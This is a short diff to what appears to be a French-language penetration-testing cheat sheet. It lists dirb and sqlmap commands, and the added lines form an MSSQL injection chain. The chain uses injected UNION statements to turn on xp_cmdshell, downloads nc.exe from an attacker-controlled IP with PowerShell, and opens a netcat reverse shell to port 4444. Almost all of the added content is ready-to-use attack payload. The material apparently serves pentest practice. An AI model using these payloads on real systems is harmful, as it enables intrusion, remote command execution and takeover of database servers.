@@ -14,4 +14,11 @@ dirb http://[fichier a tester] /usr/share/wordlists/dirb/mutations_common.txt -t
 sqlmap -u [URL] (--dbs / --tables -D [DATABASE] / --columns -D [DATABASE] -T [TABLENAME])  
 sqlmap -r [FILE] (--dbs / --tables -D [DATABASE] / --columns -D [DATABASE] -T [TABLENAME])   
 A la main: http://192.168.1.50/wordpress/sql-injection-cheat-sheet/  
- 
+
+**commande injection in MSQL:**  
+admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+  
+admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+  
+admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+  
+admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+  
+EXEC xp_cmdshell 'powershell.exe wget http://[IP]/nc.exe -OutFile c:\\Users\Public\\nc.exe'  
+EXEC xp_cmdshell 'c:\\Users\Public\\nc.exe -e cmd.exe [IP] 4444'  
